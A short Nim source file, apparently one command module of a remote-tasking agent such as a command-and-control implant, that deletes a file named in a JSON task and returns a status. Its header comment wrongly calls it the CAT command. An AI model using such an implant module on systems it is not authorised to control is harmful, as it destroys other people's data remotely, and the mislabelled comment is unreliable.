# This is the source for the CAT command
import ../structs
import ../utils
import json
import os

#[
  Remove File

]#
proc cmd_rm*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  var path = params["path"].getStr()
  let file = params["file"].getStr()
  let host = params["host"].getStr()

  # Configure Output
  var
    status = ""

  if file != "":
    path = path / file
  # Do the Magic
  let finalPath = resolveCorrectPath(path, host)
  DBG("RESOLVED: " & finalPath)

  try:
    removeFile(finalPath)
  except OSError:
    status = "error"

  return buildReturnData(task.id, "", status)

